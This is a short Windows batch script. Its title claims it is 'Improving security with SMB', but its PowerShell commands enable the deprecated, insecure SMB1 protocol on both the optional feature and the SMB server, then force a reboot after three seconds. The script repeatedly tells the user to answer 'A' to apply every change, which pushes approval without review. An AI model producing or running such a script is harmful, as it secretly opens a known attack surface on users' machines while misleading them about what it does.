@echo off
title Improving security with SMB...

echo Please write for A (to ALL apply)
powershell -Command "Enable-WindowsOptionalFeature -Online -FeatureName SMB1Protocol"

echo Please write for A (to ALL apply)
powershell -Command "Set-SmbServerConfiguration -EnableSMB1Protocol $true"

shutdown /r /t 3
